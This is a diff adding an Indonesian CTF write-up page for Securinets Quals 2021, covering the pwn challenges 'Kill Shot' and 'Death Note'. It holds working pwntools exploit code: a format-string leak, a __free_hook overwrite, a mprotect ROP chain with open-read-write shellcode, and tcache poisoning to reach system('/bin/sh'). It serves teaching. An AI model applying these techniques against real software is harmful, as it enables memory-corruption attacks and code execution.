@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head>
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		
+		<title>Securinets Quals 2021 - Binary Exploit Abdullah</title>
+
+		
+  		<link rel="stylesheet" href="/css/style.css">
+		<link rel="stylesheet" href="/css/fonts.css">
+		
+		<link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+		<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+		
+		<link href="" rel="alternate" type="application/rss+xml" title="Abdullah" />
+	</head>
+
+    <body>
+        		<nav class="nav">
+			<div class="nav-container">
+				<a href="/">
+					<h2 class="nav-title">Abdullah</h2>
+				</a>
+				<ul>
+    
+    
+        <li>
+            <a href="/about/">
+                
+                <span>About</span>
+                
+            </a>
+        </li>
+    
+        <li>
+            <a href="/posts/">
+                
+                <span>Posts</span>
+                
+            </a>
+        </li>
+    
+</ul>
+			</div>
+		</nav>
+
+        
+
+<main>
+	<div class="post">
+		
+		
+    <h1 class="post-title">Securinets Quals 2021 - Binary Exploit</h1>
+    <div class="post-line"></div>
+
+
+		
+
+
+		<p>First note, aku mengerjakan ini semalam setelah kompetisi selesai. Iseng-iseng buka ctftime, di running event ada ini. Tapi, ternyata waktu -1 jam selesai event ini :'(.</p>
+<h1 id="kill-shot">Kill Shot</h1>
+<p>Simplenya, kita diberi <code>printf</code> yang parameternya kita kontrol untuk mendapakan leak, dan fungsi <code>kill</code> untuk <code>write-what-where</code>. Setelahnya, diberi <code>add</code> dan <code>delete</code> yang secara berurutan fungsi tersebut menggunakan <code>malloc</code> dan <code>free</code> seperti heap exploitation pada umumnya. Sejauh yang aku baca, tidak ada bug pada 2 fungsi tersebut.</p>
+<h2 id="analysist">Analysist</h2>
+<p>Kita mempunyai infomation leaks pada fungsi <code>sub_FE3</code> yang dipanggil diawal program. Dan arbitrary-write pada fungsi <code>kill</code>. Dua fungsi tersebut bisa kita manfaatkan untuk exploitasi binary ini.</p>
+<p>Binary ini menggunakan <code>seccomp</code> untuk menfilter system call yang diizinkan oleh binary. Karena ini, inject shellcode mungkin diperlukan (?).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">  line  CODE  JT   JF      K
+  <span style="color:#f92672">=================================</span>
+  <span style="color:#ae81ff">0000</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000004</span>  A <span style="color:#f92672">=</span> arch
+  <span style="color:#ae81ff">0001</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x09</span> <span style="color:#ae81ff">0xc000003e</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">!=</span> ARCH_X86_64) goto <span style="color:#ae81ff">0011</span>
+  <span style="color:#ae81ff">0002</span>: <span style="color:#ae81ff">0x20</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  A <span style="color:#f92672">=</span> sys_number
+  <span style="color:#ae81ff">0003</span>: <span style="color:#ae81ff">0x35</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x40000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x40000000</span>) goto <span style="color:#ae81ff">0005</span>
+  <span style="color:#ae81ff">0004</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0xffffffff</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xffffffff</span>) goto <span style="color:#ae81ff">0011</span>
+  <span style="color:#ae81ff">0005</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x04</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> read) goto <span style="color:#ae81ff">0010</span>
+  <span style="color:#ae81ff">0006</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x03</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000001</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> write) goto <span style="color:#ae81ff">0010</span>
+  <span style="color:#ae81ff">0007</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x02</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000005</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> fstat) goto <span style="color:#ae81ff">0010</span>
+  <span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x0000000a</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">==</span> mprotect) goto <span style="color:#ae81ff">0010</span>
+  <span style="color:#ae81ff">000</span><span style="color:#ae81ff">9</span>: <span style="color:#ae81ff">0x15</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x01</span> <span style="color:#ae81ff">0x00000101</span>  <span style="color:#66d9ef">if</span> (A <span style="color:#f92672">!=</span> openat) goto <span style="color:#ae81ff">0011</span>
+  <span style="color:#ae81ff">0010</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x7fff0000</span>  <span style="color:#66d9ef">return</span> ALLOW
+  <span style="color:#ae81ff">0011</span>: <span style="color:#ae81ff">0x06</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00</span> <span style="color:#ae81ff">0x00000000</span>  <span style="color:#66d9ef">return</span> KILL
+</code></pre></div><h2 id="exploit">Exploit</h2>
+<p>Information leaks (pie, libc, heap, etc), didapatkan pada fungsi <code>sub_FE3</code> yang sudah aku tulis diatas.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;%4$p||%6$p||%25$p||%13$p||&#34;</span> 
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, payload)
+
+leaks <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;||&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+heap, stack, libc_start_main, pie <span style="color:#f92672">=</span> map(<span style="color:#66d9ef">lambda</span> x: int(x, <span style="color:#ae81ff">16</span>), leaks)
+
+stack_rip <span style="color:#f92672">=</span> stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xD8</span>
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_start_main <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21b97</span>
+elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> pie <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xd8c</span>
+</code></pre></div><p>Pertama, dengan fungsi <code>kill</code>, overwrite <code>&amp;__free_hook</code> ke fungsi <code>kill</code> untuk dapat arbitrary-read terus-menerus. Panggil <code>free</code> untuk mentriggernya.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, f<span style="color:#e6db74">&#39;{libc.sym.__free_hook}&#39;</span>)
+r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, p64(elf<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>kill))
+
+<span style="color:#75715e"># pwndbg&gt; tel &amp;__free_hook 1</span>
+<span style="color:#75715e"># 00:0000 │ 0x1555553268e8 (__free_hook) —▸ 0x5555555550b4 (kill) ◂— push   rbp</span>
+</code></pre></div><p>Arbitrary-write ini akan aku gunakan untuk tulis ropchain ke <code>saved rip</code> yang akan panggil <code>mprotect</code> untuk membuat heap memory memiliki executable permission. Yang pada akhirnya kita akan return ke shellcode kita untuk mendapatkan flagnya.</p>
+<p>Sekarang, siapkan shellcodenya. Kenapa shellcode dulu? karena kita harus kalkulasi address shellcode kita di heap dengan leaked heap address tadi, yang nantinya address ini adalah tempat kembali kita setelah membuat memori heap menjadi executable.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># open-read-write shellcode (nice pwntools!)</span>
+shellcode  <span style="color:#f92672">=</span> shellcraft<span style="color:#f92672">.</span>openat(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;/home/ctf/flag.txt&#39;</span>, <span style="color:#ae81ff">0</span>)
+shellcode <span style="color:#f92672">+=</span> shellcraft<span style="color:#f92672">.</span>read(<span style="color:#e6db74">&#39;rax&#39;</span>, <span style="color:#e6db74">&#39;rsp&#39;</span>, <span style="color:#ae81ff">0x47</span>)
+shellcode <span style="color:#f92672">+=</span> shellcraft<span style="color:#f92672">.</span>write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#39;rsp&#39;</span>, <span style="color:#ae81ff">0x47</span>)
+
+<span style="color:#75715e"># add(200, asm(shellcode))</span>
+add(<span style="color:#ae81ff">200</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;XXXXXXXX&#39;</span>)
+
+<span style="color:#75715e"># pwndbg&gt; dq 0x5555557580f0-0x10</span>
+<span style="color:#75715e"># 00005555557580e0     0000000000000001 00000000000000d1</span>
+<span style="color:#75715e"># 00005555557580f0     5858585858585858 0000000000000000</span>
+<span style="color:#75715e">#                                    ^^ our shellcode start here</span>
+<span style="color:#75715e"># 0000555555758100     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 0000555555758110     0000000000000000 0000000000000000</span>
+
+shellcode_start <span style="color:#f92672">=</span> heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xE90</span>
+
+<span style="color:#75715e"># pwndbg&gt; p/x 0x5555557580f0-0x555555757260</span>
+<span style="color:#75715e"># $2 = 0xe90</span>
+</code></pre></div><p>Sekarang tinggal ropchain untuk ubah permission heap menjadi executable, lalu return ke shellcode tadi.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># nice pwntools again!</span>
+rop <span style="color:#f92672">=</span> ROP(libc)
+rop<span style="color:#f92672">.</span>call(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>mprotect, [heap <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x260</span>, <span style="color:#ae81ff">0x21000</span>, <span style="color:#ae81ff">0x7</span>])
+
+payload <span style="color:#f92672">=</span> bytes(rop) <span style="color:#f92672">+</span> p64(shellcode_start)
+stack_rip <span style="color:#f92672">=</span> stack <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xD8</span>
+
+<span style="color:#66d9ef">for</span> offset <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(payload), <span style="color:#ae81ff">8</span>):
+    kill(stack_rip <span style="color:#f92672">+</span> offset, payload[offset:offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>])
+</code></pre></div><p>Exit untuk trigger ropchain dan ret ke shellcode. Sekarang <code>heap memory</code> memiliki permission executable.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">pwndbg<span style="color:#f92672">&gt;</span> vmmap
+<span style="color:#f92672">...</span>
+<span style="color:#ae81ff">0x555555755000</span>     <span style="color:#ae81ff">0x555555756000</span> r<span style="color:#f92672">--</span>p     <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">1000</span>   <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>abdullahnz<span style="color:#f92672">/</span>ctf<span style="color:#f92672">/</span>securinet<span style="color:#f92672">/</span>pwn<span style="color:#f92672">/</span>kill<span style="color:#f92672">/</span>kill_shot
+<span style="color:#ae81ff">0x555555756000</span>     <span style="color:#ae81ff">0x555555757000</span> rw<span style="color:#f92672">-</span>p     <span style="color:#ae81ff">1000</span> <span style="color:#ae81ff">2000</span>   <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>abdullahnz<span style="color:#f92672">/</span>ctf<span style="color:#f92672">/</span>securinet<span style="color:#f92672">/</span>pwn<span style="color:#f92672">/</span>kill<span style="color:#f92672">/</span>kill_shot
+<span style="display:block;width:100%;background-color:#3c3d38"><span style="color:#ae81ff">0x555555757000</span>     <span style="color:#ae81ff">0x555555778000</span> rwxp    <span style="color:#ae81ff">21000</span> <span style="color:#ae81ff">0</span>      [heap]
+</span><span style="color:#ae81ff">0x7ffffffde000</span>     <span style="color:#ae81ff">0x7ffffffff000</span> rw<span style="color:#f92672">-</span>p    <span style="color:#ae81ff">21000</span> <span style="color:#ae81ff">0</span>      [stack]
+<span style="color:#f92672">...</span>
+</code></pre></div><h2 id="footnote">Footnote</h2>
+<p>Intended Solution dari author, adalah mengoverwrite <code>fastbinY</code> agar menunjuk ke <code>stack</code>. Agar malloc mengembalikan pointer dalam range <code>stack</code>. Malloc ke-N akan me-return alamat <code>stack</code> yang berisi address dari <code>RIP</code>. Dan melakukan ropchain open-read-write, menggunakan <code>openat</code>.</p>
+<h2 id="flag">Flag</h2>
+<p><code>flag{this_really_needs_a_kill_shot!_cc5dcc74acd62fa74899efaff22d8f79}</code></p>
+<h1 id="death-note">Death Note</h1>
+<p>Create, edit, view, delete seperti heap exploitation pada umumnya.</p>
+<h2 id="analysist-1">Analysist</h2>
+<p>Create melakukan malloc dengan size dari user dengan constraint, <code>0 &gt; size &lt; 0x100</code>. Dengan index array mencari yang kosong dan ditentukan oleh sistem. Data array hanya berukuran 10.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">create</span>()
+{
+  <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>note_ptr; <span style="color:#75715e">// rbx@5
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> result; <span style="color:#75715e">// eax@5
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [sp+8h] [bp-18h]@1
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> size; <span style="color:#75715e">// [sp+Ch] [bp-14h]@3
+</span><span style="color:#75715e"></span>
+  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ; <span style="color:#f92672">++</span>i )
+  {
+    <span style="color:#66d9ef">if</span> ( i <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">9</span> )
+      <span style="color:#66d9ef">return</span> puts(<span style="color:#e6db74">&#34;Enough targets for today!&#34;</span>);
+    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!*</span>(<span style="color:#ae81ff">8LL</span> <span style="color:#f92672">*</span> i <span style="color:#f92672">+</span> gdata) )
+      <span style="color:#66d9ef">break</span>;
+  }
+  write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Provide note size:&#34;</span>, <span style="color:#ae81ff">0x12uLL</span>);
+  size <span style="color:#f92672">=</span> read_long();
+  <span style="color:#66d9ef">if</span> ( size <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">||</span> size <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xFF</span> )
+  {
+    result <span style="color:#f92672">=</span> puts(<span style="color:#e6db74">&#34;Wrong size!&#34;</span>);
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    note_ptr <span style="color:#f92672">=</span> (gdata <span style="color:#f92672">+</span> <span style="color:#ae81ff">8LL</span> <span style="color:#f92672">*</span> i);
+    <span style="color:#f92672">*</span>note_ptr <span style="color:#f92672">=</span> malloc(size);
+    gsize[i] <span style="color:#f92672">=</span> size;
+    result <span style="color:#f92672">=</span> printf(<span style="color:#e6db74">&#34;Note is created at index: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i);
+  }
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>Edit ini melakukan read array yang sudah diallokasikan oleh user dengan constraint <code>index &lt; 9</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">ssize_t <span style="color:#a6e22e">edit</span>()
+{
+  ssize_t result; <span style="color:#75715e">// rax@3
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> v1; <span style="color:#75715e">// [sp+Ch] [bp-4h]@1
+</span><span style="color:#75715e"></span>
+  write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Provide note index: &#34;</span>, <span style="color:#ae81ff">0x14uLL</span>);
+  v1 <span style="color:#f92672">=</span> read_long();
+  <span style="color:#66d9ef">if</span> ( v1 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">9</span> )
+  {
+    result <span style="color:#f92672">=</span> write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;The death note isn&#39;t that big unfortunately</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x2CuLL</span>);
+  }
+  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(<span style="color:#ae81ff">8LL</span> <span style="color:#f92672">*</span> v1 <span style="color:#f92672">+</span> gdata) )
+  {
+    write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Name: &#34;</span>, <span style="color:#ae81ff">6uLL</span>);
+    result <span style="color:#f92672">=</span> read(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">*</span>(<span style="color:#ae81ff">8LL</span> <span style="color:#f92672">*</span> v1 <span style="color:#f92672">+</span> gdata), gsize[v1]);
+  }
+  <span style="color:#66d9ef">else</span>
+  {
+    result <span style="color:#f92672">=</span> write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Page doesn&#39;t even exist!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x19uLL</span>);
+  }
+  <span style="color:#66d9ef">return</span> result;
+}
+</code></pre></div><p>Delete akan melakukan <code>free</code> ke index yang sudah diallokasikan dan ditentukan oleh user. Setelah di-free, pointer di set menjadi <code>null</code>, no uaf here. Dan view akan menoutputkan informasi data dari index yang diberikan.</p>
+<h2 id="finding-the-bug">Finding the Bug</h2>
+<p>Bugnya secara jelas ada di <code>edit</code>. Karena contraint hanya <code>index &lt; 9</code> dengan bilangan negatif ini akan lolos. Lalu untuk apa? ini akan aku jabarkan nanti.</p>
+<h2 id="exploit-1">Exploit</h2>
+<p>Untuk mempermudah interaksi dengan soal,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(size):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;:&#39;</span>, f<span style="color:#e6db74">&#39;{size}&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(idx, data):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;2&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;:&#39;</span>, f<span style="color:#e6db74">&#39;{idx}&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;: &#39;</span>, data)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(idx):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;3&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;: &#39;</span>, f<span style="color:#e6db74">&#39;{idx}&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">view</span>(idx):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Exit</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;4&#39;</span>)
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;:&#39;</span>, f<span style="color:#e6db74">&#39;{idx}&#39;</span>)
+    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)
+</code></pre></div><p>Leak libc address dengan memenuhi <code>tcachebins</code>, lalu free lagi dengan size yang sama. Karena <code>tcachebins</code> sudah penuh, chunk terakhir yang di free akan masuk ke <code>unsortedbins</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+    create(<span style="color:#ae81ff">0x80</span>)
+
+create(<span style="color:#ae81ff">0x20</span>)
+
+<span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+    delete(_)
+
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x90 [  7]: 0x555555757620 —▸ 0x555555757590 —▸ 0x555555757500 —▸ 0x555555757470 —▸ 0x5555557573e0 —▸ 0x555555757350 —▸ 0x5555557572c0 ◂— 0x0</span>
+
+<span style="color:#75715e"># unsortedbin</span>
+<span style="color:#75715e"># all: 0x5555557576d0 —▸ 0x155555324ca0 (main_arena+96) ◂— 0x5555557576d0</span>
+</code></pre></div><p>Sekarang, untuk leak hanya allokasikan chunks size &lt; chunk unsortedbins. FD dan BK pointer dari chunk ini akan menunjuk ke <code>main_arena</code> yang letaknya dilibc.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">create(<span style="color:#ae81ff">0x20</span>)
+<span style="color:#75715e"># pwndbg&gt; dq 0x5555557576a0</span>
+<span style="color:#75715e"># 00005555557576a0     0000000000000000 0000000000000031 </span>
+<span style="color:#75715e"># 00005555557576b0     0000155555324d20 0000155555324d20 -&gt; chunks[0]&#39;s data</span>
+<span style="color:#75715e"># 00005555557576c0     0000000000000000 0000000000000000</span>
+
+leak <span style="color:#f92672">=</span> u64(view(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3ebd20</span>
+
+delete(<span style="color:#ae81ff">0</span>)
+</code></pre></div><p>Kondisi tcachebins, <code>array_data_notes</code> dan chunk diatasnya pada heap sekarang,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">tcachebins
+<span style="color:#ae81ff">0x30</span> [  <span style="color:#ae81ff">1</span>]: <span style="color:#ae81ff">0x5555557576b0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x0</span>
+<span style="color:#ae81ff">0x90</span> [  <span style="color:#ae81ff">7</span>]: <span style="color:#ae81ff">0x555555757620</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x555555757590</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x555555757500</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x555555757470</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x5555557573e0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x555555757350</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x5555557572c0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x0</span>
+
+<span style="color:#ae81ff">0x555555757000</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000251</span>	<span style="color:#f92672">........</span>Q<span style="color:#f92672">.......</span>
+<span style="color:#ae81ff">0x555555757010</span>	<span style="color:#ae81ff">0x0700000000000100</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#f92672">................</span>
+<span style="color:#ae81ff">0x555555757050</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x00005555557576b0</span>	<span style="color:#f92672">.........</span>vuUUU<span style="color:#f92672">..</span>
+<span style="color:#ae81ff">0x555555757080</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000555555757620</span>	<span style="color:#f92672">........</span> vuUUU<span style="color:#f92672">..</span>
+<span style="color:#ae81ff">0x555555757250</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000061</span>	<span style="color:#f92672">........</span>a<span style="color:#f92672">.......</span>
+<span style="color:#ae81ff">0x555555757260</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#f92672">................</span> <span style="color:#f92672">-&gt;</span> array_data_notes[<span style="color:#ae81ff">10</span>]
+<span style="color:#ae81ff">0x555555757270</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#f92672">................</span>
+<span style="color:#ae81ff">0x555555757280</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#f92672">................</span>
+<span style="color:#ae81ff">0x555555757290</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#f92672">................</span>
+<span style="color:#ae81ff">0x5555557572a0</span>	<span style="color:#ae81ff">0x0000555555757740</span>	<span style="color:#ae81ff">0x0000000000000000</span>	<span style="color:#a6e22e">@wuUUU..........</span>
+<span style="color:#ae81ff">0x5555557572b0</span>	<span style="color:#ae81ff">0x0000000000000000</span>
+</code></pre></div><p>Pada alamat, <code>0x555555757088</code> berisi <code>0x555555757620</code>, yang mana itu merupakan salah satu FD pointer free`d chunk yang ada di <code>tcachebins list</code> diatas. Karena terdapat index-out-of-bound (negative number) pada fungsi <code>edit</code>, kita bisa melakukan tcache-poisoning dengan mengedit alamat tersebut.</p>
+<p>Selanjutnya hanya mencari index yang akan menunjuk ke alamat target kita diatas. Lalu, edit agar menunjuk ke <code>__free_hook</code>. Yang nantinya akan kita overwrite ke <code>system</code> untuk mendapatkan RCE.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e"># pwndbg&gt; p (0x555555757088-0x555555757260)/8</span>
+<span style="color:#75715e"># $2 = -59</span>
+
+edit(<span style="color:#f92672">-</span><span style="color:#ae81ff">59</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;__free_hook&#39;</span>]))
+<span style="color:#75715e"># 0x90 [  7]: 0x555555757620 —▸ 0x1555553268e8 (__free_hook) ◂— 0x0</span>
+
+create(<span style="color:#ae81ff">0x80</span>) <span style="color:#75715e"># 0</span>
+edit(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+
+create(<span style="color:#ae81ff">0x80</span>) <span style="color:#75715e"># 1</span>
+edit(<span style="color:#ae81ff">1</span>, p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;system&#39;</span>]))
+<span style="color:#75715e"># pwndbg&gt; tel &amp;__free_hook 1</span>
